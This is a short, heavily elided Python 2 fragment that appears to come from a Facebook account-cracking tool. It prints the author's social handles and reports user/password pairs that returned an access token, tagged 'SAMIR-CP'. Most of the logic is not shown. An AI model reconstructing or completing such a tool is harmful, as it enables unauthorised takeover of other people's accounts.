...
def menu():
    ...
    print 'FACEBOOK : facebook.com/FOURKANUDDIN123'
    print 'GITHUB     : github.com/kazisamir4'
    print ''
    print 50* '-'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;96m[SAMIR-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[ID OPEN ON 07 DAYS]\x1b[0m \n'
